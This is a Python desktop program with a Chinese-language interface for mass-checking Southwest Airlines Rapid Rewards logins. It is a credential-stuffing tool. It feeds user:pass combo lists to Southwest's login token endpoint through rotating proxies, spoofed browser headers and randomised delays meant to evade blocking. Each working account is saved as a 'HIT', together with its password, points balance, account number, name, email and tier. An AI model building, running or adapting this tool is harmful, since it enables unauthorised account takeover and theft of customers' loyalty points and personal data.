import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import requests
import concurrent.futures
import threading
import time
import random
import queue
from itertools import cycle
from urllib.parse import urlencode
import os

LOGIN_URL = "https://www.southwest.com/api/security/v4/security/token"
USERINFO_URL = "https://www.southwest.com/api/security/v4/security/userinfo"
CLIENT_ID = "6b6199ac-6726-4642-b5bd-86eb07062161"

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

class SWACheckerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("西南航空 RR 账号批量检查器")
        self.root.geometry("920x720")
        self.root.minsize(800, 600)

        self.stop_flag = False
        self.running = False
        self.log_queue = queue.Queue()
        self.hits = []
        self.total = 0
        self.checked = 0
        self.hit_count = 0

        self.build_ui()
        self.poll_log()

    def build_ui(self):
        main = ttk.Frame(self.root, padding=10)
        main.pack(fill=tk.BOTH, expand=True)

        # ===== 上排：文件与参数 =====
        conf = ttk.LabelFrame(main, text="配置", padding=8)
        conf.pack(fill=tk.X, pady=(0, 8))

        # 账号文件
        ttk.Label(conf, text="账号文件 (user:pass):").grid(row=0, column=0, sticky="w", padx=4, pady=4)
        self.combo_path = tk.StringVar()
        ttk.Entry(conf, textvariable=self.combo_path, width=55).grid(row=0, column=1, padx=4, pady=4, sticky="ew")
        ttk.Button(conf, text="浏览…", command=self.browse_combo).grid(row=0, column=2, padx=4, pady=4)

        # 代理文件
        ttk.Label(conf, text="代理文件 (每行一条):").grid(row=1, column=0, sticky="w", padx=4, pady=4)
        self.proxy_path = tk.StringVar()
        ttk.Entry(conf, textvariable=self.proxy_path, width=55).grid(row=1, column=1, padx=4, pady=4, sticky="ew")
        ttk.Button(conf, text="浏览…", command=self.browse_proxy).grid(row=1, column=2, padx=4, pady=4)

        # 代理格式提示
        ttk.Label(conf, text="支持: http://user:pass@ip:port  或  ip:port  或  user:pass@ip:port",
                  font=("", 8), foreground="#555").grid(row=2, column=1, sticky="w", padx=4)

        # HIT 输出
        ttk.Label(conf, text="HIT 保存路径:").grid(row=3, column=0, sticky="w", padx=4, pady=4)
        self.hits_path = tk.StringVar(value="swa_hits.txt")
        ttk.Entry(conf, textvariable=self.hits_path, width=55).grid(row=3, column=1, padx=4, pady=4, sticky="ew")
        ttk.Button(conf, text="浏览…", command=self.browse_hits).grid(row=3, column=2, padx=4, pady=4)

        conf.columnconfigure(1, weight=1)

        # ===== 参数行 =====
        param = ttk.Frame(main)
        param.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(param, text="线程数:").pack(side=tk.LEFT, padx=(0, 4))
        self.threads_var = tk.IntVar(value=4)
        ttk.Spinbox(param, from_=1, to=30, textvariable=self.threads_var, width=6).pack(side=tk.LEFT, padx=(0, 16))

        ttk.Label(param, text="延迟下限(秒):").pack(side=tk.LEFT, padx=(0, 4))
        self.delay_min = tk.DoubleVar(value=0.8)
        ttk.Spinbox(param, from_=0.0, to=10.0, increment=0.1, textvariable=self.delay_min, width=6).pack(side=tk.LEFT, padx=(0, 16))

        ttk.Label(param, text="延迟上限(秒):").pack(side=tk.LEFT, padx=(0, 4))
        self.delay_max = tk.DoubleVar(value=2.0)
        ttk.Spinbox(param, from_=0.1, to=15.0, increment=0.1, textvariable=self.delay_max, width=6).pack(side=tk.LEFT, padx=(0, 16))

        self.use_proxy = tk.BooleanVar(value=True)
        ttk.Checkbutton(param, text="启用代理", variable=self.use_proxy).pack(side=tk.LEFT, padx=(0, 16))

        self.pull_userinfo = tk.BooleanVar(value=False)
        ttk.Checkbutton(param, text="额外拉 userinfo", variable=self.pull_userinfo).pack(side=tk.LEFT)

        # ===== 按钮 =====
        btnf = ttk.Frame(main)
        btnf.pack(fill=tk.X, pady=(0, 8))

        self.start_btn = ttk.Button(btnf, text="▶ 开始检查", command=self.start_check)
        self.start_btn.pack(side=tk.LEFT, padx=4)

        self.stop_btn = ttk.Button(btnf, text="■ 停止", command=self.stop_check, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=4)

        ttk.Button(btnf, text="清空日志", command=self.clear_log).pack(side=tk.LEFT, padx=4)
        ttk.Button(btnf, text="打开 HIT 文件", command=self.open_hits).pack(side=tk.LEFT, padx=4)
        ttk.Button(btnf, text="导出当前 HIT", command=self.export_hits).pack(side=tk.LEFT, padx=4)

        # ===== 进度 =====
        prog = ttk.Frame(main)
        prog.pack(fill=tk.X, pady=(0, 4))
        self.progress = ttk.Progressbar(prog, mode="determinate")
        self.progress.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(0, 8))
        self.stats_label = ttk.Label(prog, text="等待中 | 0/0 | HIT: 0", width=36)
        self.stats_label.pack(side=tk.RIGHT)

        # ===== 日志 + HIT 预览 =====
        paned = ttk.Panedwindow(main, orient=tk.VERTICAL)
        paned.pack(fill=tk.BOTH, expand=True)

        log_frame = ttk.LabelFrame(paned, text="运行日志", padding=4)
        self.log_text = scrolledtext.ScrolledText(log_frame, height=18, font=("Consolas", 9), wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        paned.add(log_frame, weight=3)

        hit_frame = ttk.LabelFrame(paned, text="HIT 实时列表", padding=4)
        self.hit_text = scrolledtext.ScrolledText(hit_frame, height=8, font=("Consolas", 9), wrap=tk.WORD, fg="#0a0")
        self.hit_text.pack(fill=tk.BOTH, expand=True)
        paned.add(hit_frame, weight=1)

        # 底部状态
        self.status = ttk.Label(main, text="就绪 — 选择账号文件后点击开始", relief=tk.SUNKEN, anchor="w")
        self.status.pack(fill=tk.X, pady=(6, 0))

    def browse_combo(self):
        p = filedialog.askopenfilename(title="选择账号文件", filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if p:
            self.combo_path.set(p)

    def browse_proxy(self):
        p = filedialog.askopenfilename(title="选择代理文件", filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if p:
            self.proxy_path.set(p)

    def browse_hits(self):
        p = filedialog.asksaveasfilename(title="HIT 保存路径", defaultextension=".txt",
                                         filetypes=[("Text", "*.txt")])
        if p:
            self.hits_path.set(p)

    def log(self, msg):
        self.log_queue.put(msg)

    def poll_log(self):
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, msg + "\n")
                self.log_text.see(tk.END)
        except queue.Empty:
            pass
        self.root.after(100, self.poll_log)

    def clear_log(self):
        self.log_text.delete("1.0", tk.END)
        self.hit_text.delete("1.0", tk.END)

    def open_hits(self):
        path = self.hits_path.get().strip()
        if path and os.path.isfile(path):
            os.startfile(path) if os.name == "nt" else os.system(f'open "{path}"' if sys.platform == "darwin" else f'xdg-open "{path}"')
        else:
            messagebox.showinfo("提示", "HIT 文件还不存在")

    def export_hits(self):
        if not self.hits:
            messagebox.showinfo("提示", "当前没有 HIT")
            return
        p = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if p:
            with open(p, "w", encoding="utf-8") as f:
                f.write("\n".join(self.hits) + "\n")
            messagebox.showinfo("完成", f"已导出 {len(self.hits)} 条 → {p}")

    def normalize_proxy(self, line):
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        if line.startswith("http://") or line.startswith("https://") or line.startswith("socks"):
            return line
        if "@" in line:
            return "http://" + line
        # ip:port
        return "http://" + line

    def load_proxies(self):
        path = self.proxy_path.get().strip()
        if not path or not os.path.isfile(path):
            return []
        with open(path, encoding="utf-8", errors="ignore") as f:
            px = [self.normalize_proxy(l) for l in f]
        return [p for p in px if p]

    def load_combos(self):
        path = self.combo_path.get().strip()
        if not path or not os.path.isfile(path):
            return []
        with open(path, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if ":" in l and not l.strip().startswith("#")]

    def check_one(self, combo, proxy_cycle):
        if self.stop_flag:
            return None
        combo = combo.strip()
        if ":" not in combo:
            return f"SKIP|{combo}"
        user, pwd = combo.split(":", 1)
        proxy = next(proxy_cycle) if proxy_cycle else None

        s = requests.Session()
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}

        headers = {
            "User-Agent": random.choice(UA_LIST),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.southwest.com",
            "Referer": "https://www.southwest.com/",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        data = {
            "username": user,
            "password": pwd,
            "scope": "openid",
            "response_type": "id_token swa_token",
            "client_id": CLIENT_ID,
        }

        try:
            r = s.post(LOGIN_URL, headers=headers, data=urlencode(data), timeout=20)
            if r.status_code != 200:
                return f"BAD|{user}|http_{r.status_code}"

            j = r.json()
            access = j.get("access_token")
            points = j.get("customers.userInformation.redeemablePoints")
            if points is None:
                points = j.get("redeemablePoints")
            acct = j.get("customers.userInformation.accountNumber") or user
            email = j.get("customers.userInformation.primaryEmail") or ""
            name = f"{j.get('customers.userInformation.firstName', '')} {j.get('customers.userInformation.lastName', '')}".strip()
            tier = j.get("customers.userInformation.tier") or ""
            status = j.get("customers.userInformation.accountStatus") or ""

            if not access and points is None and "id_token" not in j:
                return f"BAD|{user}|no_token"

            if self.pull_userinfo.get() and access and points is None:
                try:
                    uh = dict(headers)
                    uh["Authorization"] = f"Bearer {access}"
                    if j.get("id_token"):
                        uh["X-API-IDTOKEN"] = j["id_token"]
                    ur = s.get(USERINFO_URL, headers=uh, timeout=15)
                    if ur.status_code == 200:
                        uj = ur.json()
                        ui = uj.get("customers", {}).get("UserInformation") or uj.get("customers", {}).get("userInformation") or {}
                        points = ui.get("redeemablePoints") or points
                        email = email or ui.get("primaryEmail") or ""
                except Exception:
                    pass

            pts = points if points is not None else "unknown"
            return f"HIT|{user}:{pwd}|points:{pts}|acct:{acct}|name:{name}|email:{email}|tier:{tier}|status:{status}"

        except Exception as e:
            return f"ERR|{user}|{type(e).__name__}:{e}"

    def worker_done(self, res):
        self.checked += 1
        if res is None:
            return
        self.log(res)
        if res.startswith("HIT|"):
            self.hit_count += 1
            self.hits.append(res)
            self.hit_text.insert(tk.END, res + "\n")
            self.hit_text.see(tk.END)
            try:
                with open(self.hits_path.get().strip() or "swa_hits.txt", "a", encoding="utf-8") as o:
                    o.write(res + "\n")
            except Exception as e:
                self.log(f"写HIT失败: {e}")
        pct = (self.checked / self.total * 100) if self.total else 0
        self.progress["value"] = pct
        self.stats_label.config(text=f"已检 {self.checked}/{self.total} | HIT: {self.hit_count}")
        self.status.config(text=res[:80])

    def run_batch(self):
        combos = self.load_combos()
        if not combos:
            self.log("错误: 没有有效账号 (格式 user:pass)")
            self.finish_ui()
            return

        proxies = self.load_proxies() if self.use_proxy.get() else []
        if self.use_proxy.get() and not proxies:
            self.log("警告: 启用了代理但代理文件为空/无效 → 直连（容易封）")
            proxy_cycle = cycle([None])
        else:
            proxy_cycle = cycle(proxies) if proxies else cycle([None])
            if proxies:
                self.log(f"已加载代理 {len(proxies)} 条")

        self.total = len(combos)
        self.checked = 0
        self.hit_count = 0
        self.hits = []
        self.progress["value"] = 0
        threads = max(1, min(30, self.threads_var.get()))
        dmin = self.delay_min.get()
        dmax = max(dmin, self.delay_max.get())

        self.log(f"开始 | 账号:{self.total} | 线程:{threads} | 延迟:{dmin}-{dmax}s")
        self.status.config(text="运行中…")

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futures = []
            for c in combos:
                if self.stop_flag:
                    break
                fut = ex.submit(self.check_one, c, proxy_cycle)
                futures.append(fut)
                time.sleep(random.uniform(dmin, dmax) / max(threads, 1))  # 提交节奏

            for fut in concurrent.futures.as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    res = fut.result()
                except Exception as e:
                    res = f"ERR|future|{e}"
                self.root.after(0, self.worker_done, res)

        self.root.after(0, self.finish_ui)
        self.log(f"结束 | 总检:{self.checked} | HIT:{self.hit_count} → {self.hits_path.get()}")

    def finish_ui(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status.config(text=f"完成 | HIT: {self.hit_count}")

    def start_check(self):
        if self.running:
            return
        if not self.combo_path.get().strip():
            messagebox.showwarning("提示", "请先选择账号文件")
            return
        self.stop_flag = False
        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.clear_log()
        t = threading.Thread(target=self.run_batch, daemon=True)
        t.start()

    def stop_check(self):
        self.stop_flag = True
        self.log("正在停止…（等待已提交任务结束）")
        self.status.config(text="停止中…")

if __name__ == "__main__":
    import sys
    root = tk.Tk()
    # 简单深色可自行改
    try:
        ttk.Style().theme_use("clam")
    except Exception:
        pass
    app = SWACheckerGUI(root)
    root.mainloop()
